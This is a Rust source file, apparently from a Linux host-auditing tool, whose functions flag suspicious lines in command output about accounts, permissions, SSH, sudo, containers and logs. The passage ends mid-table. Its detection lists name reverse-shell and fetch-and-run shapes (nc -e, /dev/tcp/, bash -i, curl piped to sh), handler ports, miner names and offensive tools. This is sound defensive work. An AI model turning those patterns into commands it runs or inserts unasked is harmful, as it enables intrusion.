//! Which output lines of a read-only catalog command look abnormal.
//!
//! The rules live beside the catalog because only the core knows which fixed
//! command produced a line. A rule marks a line only when it is confident, so a
//! highlight keeps meaning; everything unrecognised stays neutral.

/// Classifies a single output line of one catalog command.
pub type LineRule = fn(&str) -> bool;

/// Upper bound on the marks one run can carry, matching the display cap.
pub const MAX_FINDING_LINES: usize = 2_000;

const STANDARD_DIRS: [&str; 10] = [
    "/bin/",
    "/sbin/",
    "/usr/bin/",
    "/usr/sbin/",
    "/usr/lib/",
    "/usr/lib64/",
    "/usr/libexec/",
    "/lib/",
    "/lib64/",
    "/usr/local/lib/",
];

const TEMP_ROOTS: [&str; 6] = [
    "/tmp/",
    "/var/tmp/",
    "/dev/shm/",
    "/run/",
    "/var/run/",
    "/var/lock/",
];

const TEMP_DIRS: [&str; 6] = [
    "/tmp",
    "/var/tmp",
    "/dev/shm",
    "/run",
    "/run/lock",
    "/var/lock",
];

/// Set-user-ID programs a stock distribution ships.
const STANDARD_SUID: [&str; 40] = [
    "at",
    "chage",
    "chfn",
    "chsh",
    "crontab",
    "dbus-daemon-launch-helper",
    "exim4",
    "expiry",
    "fusermount",
    "fusermount3",
    "gnome-keyring-daemon",
    "gpasswd",
    "ksu",
    "mount",
    "mount.cifs",
    "mount.nfs",
    "newgidmap",
    "newgrp",
    "newuidmap",
    "ntfs-3g",
    "pam_timestamp_check",
    "passwd",
    "ping",
    "ping6",
    "pkexec",
    "polkit-agent-helper-1",
    "procmail",
    "sg",
    "snap-confine",
    "ssh-keysign",
    "staprun",
    "su",
    "sudo",
    "suexec",
    "umount",
    "umount.nfs",
    "umount.udisks2",
    "unix_chkpwd",
    "usernetctl",
    "vmware-user-suid-wrapper",
];

/// Set-group-ID programs a stock distribution ships.
const STANDARD_SGID: [&str; 23] = [
    "at",
    "bsd-write",
    "cgexec",
    "chage",
    "crontab",
    "dotlockfile",
    "expiry",
    "locate",
    "mail-lock",
    "mail-touchlock",
    "mail-unlock",
    "mlocate",
    "netreport",
    "postdrop",
    "postqueue",
    "screen",
    "ssh-agent",
    "ssh-keysign",
    "tmux",
    // Ubuntu ships a second PAM helper beside unix_chkpwd for the extrausers
    // NSS module; without it every Ubuntu host reports a false SGID finding.
    "pam_extrausers_chkpwd",
    "unix_chkpwd",
    "utempter",
    "wall",
];

/// Capabilities that hand out privilege on their own.
const DANGEROUS_CAPABILITIES: [&str; 12] = [
    "cap_setuid",
    "cap_setgid",
    "cap_sys_admin",
    "cap_dac_override",
    "cap_dac_read_search",
    "cap_sys_ptrace",
    "cap_sys_module",
    "cap_chown",
    "cap_fowner",
    "cap_sys_rawio",
    "cap_net_admin",
    "cap_sys_chroot",
];

/// Lines a command prints about itself: separators, fallbacks, headers. They
/// are never findings, whatever the rule says.
pub fn informational(line: &str) -> bool {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with("---") || trimmed.starts_with('#') {
        return true;
    }
    [
        "不可用",
        "未安装",
        "需要更高权限",
        "未发现",
        "未检测到",
        "未识别",
        "无安装记录",
        "not available",
        "not supported",
        "No such file",
        "Permission denied",
    ]
    .iter()
    .any(|marker| trimmed.contains(marker))
}

/// Marks every output line the rule recognises, bounded for memory.
pub fn finding_lines(output: &str, rule: Option<LineRule>) -> Vec<u32> {
    let Some(rule) = rule else {
        return Vec::new();
    };
    let mut marks = Vec::new();
    for (index, line) in output.lines().enumerate() {
        if marks.len() >= MAX_FINDING_LINES {
            break;
        }
        if informational(line) || !rule(line) {
            continue;
        }
        let Ok(index) = u32::try_from(index) else {
            break;
        };
        marks.push(index);
    }
    marks
}

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

fn in_standard_dir(path: &str) -> bool {
    STANDARD_DIRS.iter().any(|dir| path.starts_with(dir))
}

fn under_temp_root(path: &str) -> bool {
    TEMP_DIRS.contains(&path) || TEMP_ROOTS.iter().any(|root| path.starts_with(root))
}

/// Recognises a permission column such as `-rwxr-xr-x` or `drwxrwxrwt`.
fn looks_like_mode(field: &str) -> bool {
    field.len() >= 10
        && field.as_bytes().iter().take(10).all(|byte| {
            matches!(
                byte,
                b'-' | b'r'
                    | b'w'
                    | b'x'
                    | b's'
                    | b't'
                    | b'S'
                    | b'T'
                    | b'd'
                    | b'l'
                    | b'c'
                    | b'b'
                    | b'p'
            )
        })
}

/// `ls -l` puts the mode first; `find -ls` puts it in the third column.
fn mode_field(fields: &[&str]) -> Option<usize> {
    let index = [0usize, 2].into_iter().find(|index| {
        fields
            .get(*index)
            .is_some_and(|field| looks_like_mode(field))
    })?;
    // A symbolic link always lists as lrwxrwxrwx; those bits describe the link,
    // not what it points at, so reading them flags /bin -> usr/bin as
    // world-writable and teaches the operator to ignore the highlight.
    if fields[index].starts_with('l') {
        return None;
    }
    Some(index)
}

fn granted(mode: &str, offset: usize) -> bool {
    mode.as_bytes()
        .get(offset)
        .is_some_and(|byte| *byte != b'-')
}

fn writable(mode: &str, offset: usize) -> bool {
    mode.as_bytes().get(offset) == Some(&b'w')
}

/// A set-user-ID program outside the stock set or outside system directories.
pub fn suid_program(line: &str) -> bool {
    let path = line.trim();
    path.starts_with('/') && !(in_standard_dir(path) && STANDARD_SUID.contains(&basename(path)))
}

/// A set-group-ID program outside the stock set.
pub fn sgid_program(line: &str) -> bool {
    let path = line.trim();
    path.starts_with('/') && !(in_standard_dir(path) && STANDARD_SGID.contains(&basename(path)))
}

/// A world-writable file anywhere except the shared temporary areas.
pub fn world_writable_file(line: &str) -> bool {
    let path = line.trim();
    path.starts_with('/') && !under_temp_root(path)
}

/// A world-writable directory that lost its sticky bit, or one outside the
/// shared temporary areas.
pub fn world_writable_directory(line: &str) -> bool {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let Some(index) = mode_field(&fields) else {
        return false;
    };
    if fields[index].as_bytes().get(9) == Some(&b'x') {
        return true;
    }
    fields
        .iter()
        .rev()
        .find(|field| field.starts_with('/'))
        .is_some_and(|path| !under_temp_root(path))
}

/// Any file the system no longer has an owner or group for.
pub fn unowned_path(line: &str) -> bool {
    line.trim().len() > 1
}

/// A file capability that grants privilege, or one on a non-system binary.
pub fn file_capability(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    if DANGEROUS_CAPABILITIES
        .iter()
        .any(|capability| lower.contains(capability))
    {
        return true;
    }
    line.split_whitespace()
        .next()
        .is_some_and(|path| path.starts_with('/') && !in_standard_dir(path))
}

/// An account or authentication file that is shared-writable, exposes a secret
/// to everyone, or is no longer owned by root.
pub fn account_file_mode(line: &str) -> bool {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let Some(index) = mode_field(&fields) else {
        return false;
    };
    let mode = fields[index];
    let path = fields.last().copied().unwrap_or("");
    let secret = ["shadow", "gshadow", "sudoers"]
        .iter()
        .any(|name| path.ends_with(name));
    let exposed = secret && (granted(mode, 7) || granted(mode, 8) || granted(mode, 9));
    let owner = fields.get(index + 2).copied().unwrap_or("root");
    writable(mode, 5) || writable(mode, 8) || exposed || owner != "root"
}

/// Either shape of the account-file listing: `ls -l` columns or a `stat`
/// summary with `uid=` and `mode=` fields.
pub fn account_file_exposure(line: &str) -> bool {
    if account_file_mode(line) {
        return true;
    }
    let secret = ["shadow", "gshadow", "sudoers"]
        .iter()
        .any(|name| line.contains(name));
    let mut flagged = false;
    for field in line.split_whitespace() {
        if let Some(owner) = field.strip_prefix("uid=") {
            flagged |= owner != "root";
        }
        if let Some(mode) = field.strip_prefix("mode=") {
            let digits = mode.as_bytes();
            let shared = |digit: Option<&u8>| matches!(digit, Some(b'2' | b'3' | b'6' | b'7'));
            let other = digits.last();
            flagged |= shared(digits.get(digits.len().wrapping_sub(2)))
                || shared(other)
                || (secret && other.is_some_and(|digit| *digit != b'0'));
        }
    }
    flagged
}

/// A directory other accounts can write into.
pub fn shared_writable_directory(line: &str) -> bool {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let Some(index) = mode_field(&fields) else {
        return false;
    };
    writable(fields[index], 5) || writable(fields[index], 8)
}

/// A named ACL entry granting write or execute beyond the base permissions.
pub fn acl_grant(line: &str) -> bool {
    let trimmed = line.trim();
    let Some(rest) = trimmed
        .strip_prefix("user:")
        .or_else(|| trimmed.strip_prefix("group:"))
    else {
        return false;
    };
    let mut parts = rest.splitn(2, ':');
    let name = parts.next().unwrap_or("");
    let permissions = parts.next().unwrap_or("");
    !name.is_empty() && (permissions.contains('w') || permissions.contains('x'))
}

/// A file locked with the immutable or append-only attribute.
pub fn locked_attribute(line: &str) -> bool {
    // lsattr -R also prints bare `path:` headers, and a path is very likely to
    // contain an "a" or an "i". Only a real attribute column counts: it is the
    // first of two fields and holds nothing but attribute letters and dashes.
    let mut fields = line.split_whitespace();
    let (Some(attributes), Some(path)) = (fields.next(), fields.next()) else {
        return false;
    };
    if fields.next().is_some() || !path.starts_with('/') {
        return false;
    }
    attributes
        .chars()
        .all(|value| value == '-' || value.is_ascii_alphabetic())
        && (attributes.contains('i') || attributes.contains('a'))
}

/// A sudo rule that skips authentication.
pub fn passwordless_sudo(line: &str) -> bool {
    line.contains("NOPASSWD") || line.contains("!authenticate")
}

/// A key file others can write to, or a private key others can read.
pub fn ssh_key_exposure(line: &str) -> bool {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let Some(index) = mode_field(&fields) else {
        return false;
    };
    let mode = fields[index];
    if writable(mode, 5) || writable(mode, 8) {
        return true;
    }
    let name = basename(fields.last().copied().unwrap_or(""));
    let private_key = !name.ends_with(".pub")
        && (name.starts_with("id_") || name.ends_with(".key") || name.ends_with(".pem"));
    private_key && (4..10).any(|offset| granted(mode, offset))
}

/// Program names that rarely belong to a long-running service.
const SHELL_LIKE: [&str; 12] = [
    "bash", "sh", "dash", "zsh", "ksh", "nc", "ncat", "netcat", "socat", "telnet", "perl", "php",
];

/// Ports that handlers and reverse shells habitually use.
const SUSPECT_PORTS: [&str; 10] = [
    ":4444", ":4445", ":1337", ":31337", ":6666", ":5555", ":12345", ":9001", ":2323", ":8443",
];

/// Fetch-and-run shapes: the signature of a planted job or a hijacked script.
const REMOTE_EXECUTION: [&str; 15] = [
    "curl ",
    "wget ",
    "base64 -d",
    "base64 --decode",
    "/dev/tcp/",
    "/dev/udp/",
    "bash -i",
    "sh -i",
    "nc -e",
    "ncat -e",
    "socat ",
    "python -c",
    "perl -e",
    "php -r",
    "| sh",
];

/// Names that mining payloads ship under.
const MINER_NAMES: [&str; 6] = [
    "xmrig",
    "minerd",
    "cpuminer",
    "kdevtmpfsi",
    "kinsing",
    "stratum+tcp",
];

const WRITABLE_AREAS: [&str; 3] = ["/tmp/", "/var/tmp/", "/dev/shm/"];

fn mentions(line: &str, markers: &[&str]) -> bool {
    let lower = line.to_ascii_lowercase();
    markers.iter().any(|marker| lower.contains(marker))
}

fn in_writable_area(line: &str) -> bool {
    WRITABLE_AREAS.iter().any(|area| line.contains(area))
}

fn first_field(line: &str) -> &str {
    line.split_whitespace().next().unwrap_or("")
}

/// `grep -rn` prefixes each hit with `path:line:`.
fn without_grep_prefix(line: &str) -> &str {
    let mut parts = line.splitn(3, ':');
    match (parts.next(), parts.next(), parts.next()) {
        (Some(_), Some(number), Some(rest)) if number.trim().parse::<u32>().is_ok() => rest,
        _ => line,
    }
}

/// Every line this command prints is already a finding by construction.
pub fn any_hit(line: &str) -> bool {
    !line.trim().is_empty()
}

/// A process running out of a writable area, fetching code, or mining.
pub fn suspicious_process(line: &str) -> bool {
    in_writable_area(line) || mentions(line, &REMOTE_EXECUTION) || mentions(line, &MINER_NAMES)
}

/// A job or startup script that pulls something down and runs it.
pub fn remote_execution_hint(line: &str) -> bool {
    mentions(without_grep_prefix(line), &REMOTE_EXECUTION) || in_writable_area(line)
}

/// A socket on a handler port, or one owned by a shell or interpreter.
pub fn suspicious_socket(line: &str) -> bool {
    if mentions(line, &SUSPECT_PORTS) || in_writable_area(line) {
        return true;
    }
    if SHELL_LIKE.contains(&first_field(line)) {
        return true;
    }
    line.split("((\"")
        .nth(1)
        .and_then(|rest| rest.split('"').next())
        .is_some_and(|name| SHELL_LIKE.contains(&name))
}

/// An interface left in packet-capture mode.
pub fn promiscuous_link(line: &str) -> bool {
    line.contains("PROMISC")
}

/// A hosts entry that points a name somewhere other than loopback.
pub fn host_override(line: &str) -> bool {
    let mut fields = line.split_whitespace();
    let Some(address) = fields.next() else {
        return false;
    };
    if !address.starts_with(|character: char| character.is_ascii_digit()) && !address.contains(':')
    {
        return false;
    }
    let loopback = address.starts_with("127.")
        || address == "::1"
        || address.starts_with("fe00:")
        || address.starts_with("ff0");
    !loopback && fields.next().is_some()
}

/// A rule that rewrites or forwards traffic through this host.
pub fn traffic_redirection(line: &str) -> bool {
    mentions(line, &["dnat", "snat", "masquerade", "redirect", "tproxy"])
}

/// A kernel switch that widens the network attack surface.
pub fn risky_network_parameter(line: &str) -> bool {
    let Some((name, value)) = line.split_once('=') else {
        return false;
    };
    let (name, value) = (name.trim(), value.trim());
    // Loopback cannot receive a redirect or a source-routed packet, so its
    // settings say nothing about how exposed the host is.
    if name.contains(".conf.lo.") {
        return false;
    }
    // Match the leaf exactly. A suffix match reads arp_filter as rp_filter, and
    // arp_filter=0 is the kernel default on every host.
    let leaf = name.rsplit('.').next().unwrap_or(name);
    if matches!(
        leaf,
        "ip_forward" | "accept_redirects" | "send_redirects" | "accept_source_route"
    ) {
        return value == "1";
    }
    matches!(leaf, "rp_filter" | "tcp_syncookies") && value == "0"
}

/// An outbound proxy forced by the environment or a profile script.
pub fn proxy_setting(line: &str) -> bool {
    mentions(without_grep_prefix(line), &["proxy="])
}

/// A superuser account that is not root.
pub fn extra_root_account(line: &str) -> bool {
    let name = first_field(line).trim();
    !name.is_empty() && name != "root"
}

/// A second superuser, or a system account handed an interactive shell.
pub fn login_account(line: &str) -> bool {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let Some(uid) = fields.get(1).and_then(|value| value.parse::<u32>().ok()) else {
        return false;
    };
    let name = fields[0];
    let shell = fields.last().copied().unwrap_or("");
    let interactive = ["/bash", "/sh", "/zsh", "/ksh", "/dash", "/csh", "/fish"]
        .iter()
        .any(|suffix| shell.ends_with(suffix));
    (uid == 0 && name != "root") || (interactive && uid > 0 && uid < 1_000)
}

/// An account whose password field is empty.
pub fn empty_password(line: &str) -> bool {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    fields.len() == 1 || fields.get(1).is_some_and(|field| field.trim().is_empty())
}

/// A privileged group that carries members beyond the account of the same name.
pub fn privileged_group_member(line: &str) -> bool {
    line.split(':')
        .nth(3)
        .is_some_and(|members| !members.trim().is_empty())
}

/// A sudo rule that skips authentication or hands everything to an account
/// outside the usual administrative groups.
pub fn sudo_grant(line: &str) -> bool {
    if passwordless_sudo(line) {
        return true;
    }
    let rule = without_grep_prefix(line).trim();
    rule.contains("ALL=(ALL")
        && !rule.starts_with("root")
        && !rule.starts_with("%sudo")
        && !rule.starts_with("%wheel")
        && !rule.starts_with("%admin")
}

/// An SSH setting that widens remote access.
pub fn risky_ssh_setting(line: &str) -> bool {
    mentions(
        line,
        &[
            "permitrootlogin yes",
            "permitrootlogin without-password",
            "permitemptypasswords yes",
            "passwordauthentication yes",
            "usepam no",
            "gatewayports yes",
        ],
    )
}

/// A policy that never expires a password or accepts an empty one.
pub fn weak_password_policy(line: &str) -> bool {
    let lower = without_grep_prefix(line).to_ascii_lowercase();
    lower.contains("nullok") || lower.contains("pass_max_days") && lower.contains("99999")
}

/// A privilege escalation that opened a shell, or an authentication failure.
pub fn privilege_command_record(line: &str) -> bool {
    if mentions(
        line,
        &["authentication failure", "incorrect password attempt"],
    ) {
        return true;
    }
    line.contains("COMMAND=")
        && mentions(
            line,
            &["/bash", "/sh", "/zsh", "/python", "/perl", "su -", " -i"],
        )
}

/// An authentication event worth a second look.
pub fn authentication_alert(line: &str) -> bool {
    mentions(
        line,
        &[
            "failed password",
            "invalid user",
            "authentication failure",
            "possible break-in",
            "failed publickey",
            "maximum authentication attempts",
        ],
    )
}

/// A password login, or any login that landed directly on root.
pub fn accepted_login(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    lower.contains("accepted password") || lower.contains("accepted ") && lower.contains(" root ")
}

/// A source that failed often enough to look like a sweep.
pub fn frequent_source(line: &str) -> bool {
    first_field(line)
        .parse::<u32>()
        .is_ok_and(|count| count >= 10)
}

/// A crash, a kill, or a refusal reported by the kernel or a service.
pub fn system_alert(line: &str) -> bool {
    mentions(
        line,
        &[
            "segfault",
            "oom-killer",
            "out of memory",
            "kernel panic",
            "denied",
            "refused",
            "traps:",
        ],
    )
}

/// A log file that has been emptied.
pub fn emptied_log(line: &str) -> bool {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let Some(index) = mode_field(&fields) else {
        return false;
    };
    // `ls -l` puts the size in column 4; `find -ls` in column 6.
    let size = if index == 0 {
        fields.get(4)
    } else {
        fields.get(6)
    };
    size == Some(&"0")
}

/// An audit record for a denied or failed operation.
pub fn audit_failure(line: &str) -> bool {
    mentions(line, &["res=failed", "success=no", "avc:", "denied"])
}

/// A path staged in a writable area, or a file carrying an execute bit.
pub fn planted_file(line: &str) -> bool {
    if in_writable_area(line) {
        return true;
    }
    let fields = line.split_whitespace().collect::<Vec<_>>();
    mode_field(&fields).is_some_and(|index| {
        let mode = fields[index];
        mode.starts_with('-') && (granted(mode, 3) || granted(mode, 6) || granted(mode, 9))
    })
}

/// A link aimed at an account or authentication file.
pub fn sensitive_symlink(line: &str) -> bool {
    mentions(
        line,
        &["-> /etc/", "-> /root", "-> /var/spool/cron", "-> /proc"],
    )
}

/// A container that borrows host privileges or host namespaces.
pub fn container_privilege(line: &str) -> bool {
    mentions(
        line,
        &["privileged=true", "pid=host", "net=host", "ipc=host"],
    )
}

/// A container that mounts a sensitive host path.
pub fn host_mount(line: &str) -> bool {
    mentions(
        line,
        &[
            "docker.sock",
            "/etc:",
            "/root:",
            "/proc:",
            "/var/log:",
            "/:/",
            "/var/run:",
        ],
    )
}

/// A runtime setting or group membership that lowers container isolation.
pub fn container_daemon_risk(line: &str) -> bool {
    mentions(
        line,
        &[
            "insecure-registries",
            "\"privileged\"",
            "tlsverify\": false",
        ],
    ) || line.starts_with("docker:") && privileged_group_member(line)
        || line.contains("docker.sock") && shared_writable_directory(line)
}

/// An environment variable that hijacks loading, history, or traffic.
pub fn injected_environment(line: &str) -> bool {
    mentions(
        without_grep_prefix(line),
        &[
            "ld_preload=",
            "ld_library_path=",
            "histfile=/dev/null",
            "histsize=0",
            "proxy=",
        ],
    )
}

/// A hardening switch that has been turned down.
pub fn weak_hardening(line: &str) -> bool {
    let Some((name, value)) = line.split_once('=') else {
        return false;
    };
    let (name, value) = (name.trim(), value.trim());
    if name.ends_with("randomize_va_space") {
        return value != "2";
    }
    if name.ends_with("suid_dumpable") {
        return value != "0";
    }
    (name.ends_with("kptr_restrict")
        || name.ends_with("dmesg_restrict")
        || name.ends_with("protected_hardlinks")
        || name.ends_with("protected_symlinks"))
        && value == "0"
}

/// Mandatory access control that is off, or only warning.
pub fn disabled_mac(line: &str) -> bool {
    mentions(line, &["disabled", "permissive"])
}

/// A boot parameter that turns protection off or hands out a root shell.
pub fn risky_boot_parameter(line: &str) -> bool {
    mentions(
        line,
        &[
            "selinux=0",
            "apparmor=0",
            "enforcing=0",
            "init=/bin/",
            "nokaslr",
        ],
    )
}

/// A kernel carrying a taint flag, e.g. from an out-of-tree module.
pub fn tainted_kernel(line: &str) -> bool {
    line.trim().parse::<u64>().is_ok_and(|value| value != 0)
}

/// Offensive tooling that has no business being installed on a defended host.
const OFFENSIVE_PACKAGES: [&str; 12] = [
    "nmap",
    "masscan",
    "hydra",
    "hashcat",
    "nikto",
    "sqlmap",
    "metasploit",
    "chisel",
    "proxychains",
    "responder",
    "john-the-ripper",
    "frpc",
];

/// Shapes that mean the same thing wherever they appear: something was staged
/// in a writable area, fetches and runs code, mines, or talks on a handler
/// port. Listing commands use this as their baseline so a clean host stays
/// quiet and a planted one still lights up.
pub fn compromise_marker(line: &str) -> bool {
    in_writable_area(line)
        || mentions(line, &REMOTE_EXECUTION)
        || mentions(line, &MINER_NAMES)
        || mentions(line, &SUSPECT_PORTS)
}

/// A routing policy or device beyond the three rules every kernel starts with.
pub fn policy_route(line: &str) -> bool {
    if mentions(line, &["dev tun", "dev ppp", "dev wg", "dev gre"]) {
        return true;
    }
    let Some(priority) = first_field(line).strip_suffix(':') else {
        return compromise_marker(line);
    };
    priority
        .parse::<u32>()
        .is_ok_and(|value| !matches!(value, 0 | 32_766 | 32_767))
}

/// A firewall that accepts by default, or accepts from anywhere.
pub fn permissive_firewall(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    lower.contains("policy accept")
        || lower.contains(":input accept")
        || lower.contains("accept")
            && lower.contains("0.0.0.0/0")
            && !lower.contains("state related")
}

/// A masked unit, or one that carries a compromise marker.
pub fn service_anomaly(line: &str) -> bool {
    line.contains("masked") || compromise_marker(line)
}

/// A filesystem or inode table that is nearly full.
pub fn high_utilisation(line: &str) -> bool {
    line.split_whitespace().any(|field| {
        field
            .strip_suffix('%')
            .and_then(|value| value.parse::<u32>().ok())
            .is_some_and(|percent| percent >= 90)
    })
}

/// A shared or user-writable mount that still allows set-user-ID programs or
/// device nodes.
pub fn insecure_mount(line: &str) -> bool {
    let exposed = ["/tmp", "/var/tmp", "/dev/shm", "/home"]
        .iter()
        .any(|target| line.split_whitespace().any(|field| field == *target));
    exposed && !(line.contains("nosuid") && line.contains("nodev"))
}

/// A session that arrived over the network, or one sitting on root.
pub fn remote_session(line: &str) -> bool {
    let remote = line.split_whitespace().any(|field| {
        field.split('.').count() == 4
            && field
                .split('.')
                .all(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit()))
    });
    remote || first_field(line) == "root" && !line.contains("tty")
}

/// A privileged group that has picked up members.
pub fn privileged_group_listing(line: &str) -> bool {
    let name = line.split(':').next().unwrap_or("");
    if ![
        "root", "wheel", "sudo", "admin", "adm", "docker", "lxd", "disk", "shadow",
    ]
    .contains(&name)
    {
        return false;
    }
    let members = line.split(':').nth(3).unwrap_or("").trim();
    if members.is_empty() {
        return false;
    }
    // Debian and Ubuntu ship syslog in adm so the logger can read its own
    // files. Reporting it on every host trains the operator to skip the line
    // that matters, so only the shipped pairing is excused.
    members
        .split(',')
        .map(str::trim)
        .filter(|member| !member.is_empty())
        .any(|member| !matches!((name, member), ("adm", "syslog")))
}

/// Every authorised key is a way in and has to be accounted for.
pub fn authorized_key(line: &str) -> bool {
    let trimmed = line.trim();
    [
        "ssh-rsa",
        "ssh-ed25519",
        "ssh-dss",
        "ecdsa-sha2",
        "sk-ssh",
        "sk-ecdsa",
    ]
    .iter()
    .any(|prefix| trimmed.starts_with(prefix) || trimmed.contains(&format!(" {prefix}")))
}

/// An account whose password has never been set, so the next login sets it.
pub fn password_never_set(line: &str) -> bool {
    // A locked system account carries no aging data on purpose, and Alpine
    // ships around twenty of them. Only an account that can actually log in is
    // worth reporting for never having had its password set.
    let mut locked = false;
    let mut never = false;
    for field in line.split_whitespace() {
        match field {
            "state=locked" => locked = true,
            "last=0" | "last=" => never = true,
            _ => {}
        }
    }
    never && !locked
}

/// Accounts that can also come from somewhere other than the local files.
pub fn external_account_source(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    ["passwd:", "group:", "shadow:"]
        .iter()
        .any(|key| lower.starts_with(key))
        && mentions(&lower, &["ldap", "sss", "nis", "winbind", "db "])
}

/// A hand-pinned neighbour entry.
pub fn static_arp(line: &str) -> bool {
    mentions(line, &["permanent", " perm", "0x6"])
}

/// A connection table large enough to look like beaconing or a flood.
pub fn high_connection_count(line: &str) -> bool {
    line.split(|character: char| !character.is_ascii_digit())
        .filter_map(|value| value.parse::<u32>().ok())
        .any(|value| value >= 500)
}

/// A container whose entrypoint is a shell, or that carries a marker.
pub fn container_workload(line: &str) -> bool {
    compromise_marker(line)
        || mentions(
            line,
            &[
                "\"/bin/sh",
                "\"/bin/bash",
                "\"sh\"",
                "\"bash\"",
                "nc -",
                "socat",
            ],
        )
}

/// An untagged image, or one pulled from a bare address.
pub fn dangling_image(line: &str) -> bool {
    line.contains("<none>")
        || first_field(line)
            .split('/')
            .next()
            .is_some_and(|registry| registry.contains(':') && registry.contains('.'))
}

/// Evidence that this session is inside a container, not on the host.
pub fn inside_container(line: &str) -> bool {
    mentions(
        line,
        &[
            ".dockerenv",
            ".containerenv",
            "/docker/",
            "/lxc/",
            "/kubepods",
        ],
    ) || matches!(line.trim(), "docker" | "lxc" | "podman" | "wsl")
}

/// A container port published to every interface, or a host-mode network.
pub fn exposed_container_port(line: &str) -> bool {
    line.contains("0.0.0.0:")
        || line.contains(":::")
        || line.split_whitespace().any(|f| f == "host")
}

/// A runtime that reports a warning or an unverified registry.
pub fn runtime_warning(line: &str) -> bool {
    mentions(line, &["warning", "insecure", "rootless: false"])
}

/// A workload that is not running cleanly.
pub fn unhealthy_workload(line: &str) -> bool {
    mentions(
        line,
        &[
            "crashloopbackoff",
            "imagepullbackoff",
            "error",
            "evicted",
            "pending",
            "unknown",
        ],
    )
}

/// A clock that is not synchronised, which breaks every log comparison.
pub fn unsynchronised_clock(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    lower.contains("synchronized: no")
        || lower.contains("ntp service: inactive")
        || lower.contains("systemd-timesyncd.service active: no")
}

/// Core dumps left enabled, which spill memory to disk.
pub fn core_dump_enabled(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    lower.contains("core file size")
        && !lower.contains(" 0")
        && (lower.contains("unlimited")
            || lower
                .split_whitespace()
                .last()
                .is_some_and(|value| value != "0"))
}

/// A load average far above what a healthy host carries.
pub fn high_load(line: &str) -> bool {
    first_field(line)
        .parse::<f64>()
        .is_ok_and(|load| load >= 8.0)
}

/// Offensive tooling present in the package list.
pub fn offensive_tool_package(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    OFFENSIVE_PACKAGES.iter().any(|name| {
        lower
            .split(|c: char| !c.is_ascii_alphanumeric() && c != '-')
            .any(|word| word == *name)
    }) || compromise_marker(line)
}

/// A pending update that closes a published vulnerability.
pub fn pending_security_update(line: &str) -> bool {
    mentions(line, &["security", "cve-"])
}

/// A rotation policy that keeps almost nothing, shrinking the evidence window.
pub fn short_log_retention(line: &str) -> bool {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    fields.first() == Some(&"rotate")
        && fields
            .get(1)
            .and_then(|value| value.parse::<u32>().ok())
            .is_some_and(|count| count <= 1)
}

/// A restart or run-level change, which bounds what the other evidence covers.
pub fn boot_event(line: &str) -> bool {
    mentions(line, &["system boot", "run-level", "runlevel", "shutdown"])
}

/// Why a rule marks a line, in the operator's words. Every rule the catalog
/// uses has an entry; the table is checked against the catalog by test.
static REASONS: &[(LineRule, &str)] = &[
    (
        accepted_login as LineRule,
        "标红的是口令登录成功，或者有人直接登录到了 root；这两种都比密钥登录更该核实。",
    ),
    (
        account_file_exposure as LineRule,
        "标红的文件属主不是 root，或者组/其他用户可写；shadow、sudoers 这类还额外检查是否对所有人可读。",
    ),
    (
        account_file_mode as LineRule,
        "标红的文件属主不是 root，或者组/其他用户可写；shadow、sudoers 这类还额外检查是否对所有人可读。",
    ),
    (
        acl_grant as LineRule,
        "标红的是标准权限之外额外授权的 ACL 条目，指定用户或组被单独放开了写或执行权限。",
    ),
    (
        any_hit as LineRule,
        "本项命令已经把范围收敛到值得关注的条目，列出的每一行都需要逐条核对。",
    ),
    (
        audit_failure as LineRule,
        "标红的审计记录是一次被拒绝或失败的操作。",
    ),
    (
        authentication_alert as LineRule,
        "标红的是登录失败、无效用户或认证失败记录，连续出现说明有人在试口令。",
    ),
    (
        authorized_key as LineRule,
        "标红的每一条都是一把能登录的公钥，需要逐把确认是自己的。",
    ),
    (
        boot_event as LineRule,
        "标红的是重启或运行级变更记录，它决定了其他证据能覆盖到哪个时间点。",
    ),
    (
        compromise_marker as LineRule,
        "标红的条目落在可写目录、带下载执行特征、命中挖矿程序名或常见 handler 端口；这是所有清单类命令共用的通用判据。",
    ),
    (
        container_daemon_risk as LineRule,
        "标红的是容器运行时的放宽配置，或 docker 组里的额外成员——加入 docker 组等同于拿到 root。",
    ),
    (
        container_privilege as LineRule,
        "标红的容器以特权模式运行，或共享了宿主的进程、网络、IPC 命名空间，逃逸成本极低。",
    ),
    (
        container_workload as LineRule,
        "标红的容器入口是 shell，或命中通用入侵特征。",
    ),
    (
        core_dump_enabled as LineRule,
        "标红的行说明 core dump 没关，进程内存会被写到磁盘上。",
    ),
    (
        dangling_image as LineRule,
        "标红的是无标签的悬空镜像，或来自裸 IP:端口 的仓库。",
    ),
    (
        disabled_mac as LineRule,
        "标红的行说明强制访问控制处于关闭或仅告警状态，SELinux/AppArmor 没有在拦截。",
    ),
    (
        emptied_log as LineRule,
        "标红的日志文件大小为 0，通常意味着被清空过。",
    ),
    (
        empty_password as LineRule,
        "标红的账号口令字段是空的，不需要口令即可登录。",
    ),
    (
        exposed_container_port as LineRule,
        "标红的端口发布到了所有网卡，或者容器直接用了宿主网络。",
    ),
    (
        external_account_source as LineRule,
        "标红的配置说明账号不只来自本机文件，还会从 LDAP、SSSD 这类外部目录取，本地清查覆盖不到。",
    ),
    (
        extra_root_account as LineRule,
        "标红的账号 UID 是 0 但不叫 root，等同于第二个超级用户。",
    ),
    (
        file_capability as LineRule,
        "标红的程序带着能直接提权的 Linux 能力位（setuid、sys_admin、dac_override 等），或者能力位挂在非系统目录的程序上。",
    ),
    (
        frequent_source as LineRule,
        "标红的来源出现次数达到 10 次以上，像是在批量尝试而不是偶发。",
    ),
    (
